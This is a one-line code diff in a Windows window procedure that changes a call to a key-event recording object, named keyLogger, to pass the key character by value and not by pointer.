@@ -55,7 +55,7 @@ LRESULT CALLBACK wndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) 
 	}
 
     if(kc != '\0' && event != KEY_none){
-        keyLogger.addKeyEvent(&kc, event);
+        keyLogger.addKeyEvent(kc, event);
 
         kc = '\0'; // Resetting default key state
         event = KEY_none; // Resetting default key event
